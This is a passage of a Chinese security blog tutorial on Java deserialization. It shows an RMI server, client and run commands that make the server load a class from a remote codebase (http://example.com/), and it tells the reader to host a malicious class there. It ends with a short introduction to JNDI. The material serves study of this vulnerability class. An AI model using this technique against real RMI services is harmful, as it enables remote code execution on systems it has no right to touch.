+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Calc</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">ICalc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">Calc</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{}</span>
+
+    <span class="kd">public</span> <span class="n">Integer</span> <span class="nf">sum</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">params</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="n">Integer</span> <span class="n">sum</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
+        <span class="k">for</span> <span class="o">(</span><span class="n">Integer</span> <span class="n">param</span> <span class="o">:</span> <span class="n">params</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">sum</span> <span class="o">+=</span> <span class="n">param</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">sum</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>RemoteRMIServer.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RemoteRMIServer</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">start</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;setup SecurityManager&#34;</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">setSecurityManager</span><span class="o">(</span><span class="k">new</span> <span class="n">SecurityManager</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="n">Calc</span> <span class="n">h</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Calc</span><span class="o">();</span>
+        <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+        <span class="n">Naming</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&#34;refObj&#34;</span><span class="o">,</span> <span class="n">h</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">new</span> <span class="n">RemoteRMIServer</span><span class="o">().</span><span class="na">start</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Client.policy</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">grant</span> <span class="p">{</span>
+    <span class="err">permission</span> <span class="err">java.security.AllPermission;</span>
+<span class="p">}</span><span class="err">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>编译及运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">javac *.java
+java -Djava.rmi.server.hostname<span class="o">=</span>10.28.178.250 -Djava.rmi.server.useCodebaseOnly<span class="o">=</span><span class="nb">false</span> -Djava.security.policy<span class="o">=</span>client.policy RemoteRMIServer
+</code></pre></td></tr></table>
+</div>
+</div><p>RMIClient.java：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIClient</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">Payload</span> <span class="kd">extends</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="o">{}</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">lookup</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ICalc</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">ICalc</span><span class="o">)</span>
+<span class="n">Naming</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;rmi://10.28.178.250:1099/refObj&#34;</span><span class="o">);</span>
+        <span class="n">List</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">li</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Payload</span><span class="o">();</span>
+        <span class="n">li</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">3</span><span class="o">);</span>
+        <span class="n">li</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">4</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">r</span><span class="o">.</span><span class="na">sum</span><span class="o">(</span><span class="n">li</span><span class="o">));</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">new</span> <span class="n">RMIClient</span><span class="o">().</span><span class="na">lookup</span><span class="o">();</span>
+<span class="o">}</span> <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这个 Client 需要在另一个位置运行，需要让 RMI Server 在本地 CLASSPATH 里找不到类，才会去加载 codebase 中的类，所以不能将 RMIClient.java 放在 RMI Server 所在的目录中。</p>
+<p>运行 RMIClient：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">java -Djava.rmi.server.useCodebaseOnly<span class="o">=</span><span class="nb">false</span> -Djava.rmi.server.codebase<span class="o">=</span>http://example.com/ RMIClient
+</code></pre></td></tr></table>
+</div>
+</div><p>只需要编译一个恶意类，将其 class 文件放置在 Web 服务器的 <code>/RMIClient$Payload.class</code> 即可。</p>
+<h2 id="2-jndi">2 JNDI</h2>
+<p>JNDI (Java Naming and Directory Interface) ，包括 Naming Service 和 Directory Service。JNDI 是 Java API，<strong>允许客户端通过名称发现和查找数据、对象</strong>。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</p>
+<h3 id="21-jndi-组成">2.1 JNDI 组成</h3>
+<ul>
+<li>Nameing Service</li>
+</ul>
+<p>命名服务，命名服务将命名名称和对象进行关联，提供通过名称找到对象的操作</p>
+<ul>
+<li>Name</li>
+</ul>
+<p>名称，要在命名系统中查找对象，需要提供对象的名称</p>
+<ul>
+<li>Binding</li>
+</ul>
+<p>绑定，一个名称和一个对象的关链称为一个绑定</p>
+<ul>
+<li>Reference</li>
+</ul>
+<p>引用，在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用</p>
+<ul>
+<li>上下文</li>
+</ul>
+<p>上下文，一个上下文是一系列名称和对象的绑定的集合</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener noreffer">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿</a></p>
+<p><a href="https://wx.zsxq.com/dweb2/index/group/2212251881" target="_blank" rel="noopener noreffer">phith0n Java 漫谈系列</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-08-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" data-title="Java反序列化漏洞系列-3"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" data-title="Java反序列化漏洞系列-3"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" data-title="Java反序列化漏洞系列-3"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/" class="prev" rel="prev" title="Java反序列化漏洞系列-2"><i class="fas fa-angle-left fa-fw"></i>Java反序列化漏洞系列-2</a>
+            <a href="/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" class="next" rel="next" title="常见Bypass Disable Functions方法">常见Bypass Disable Functions方法<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
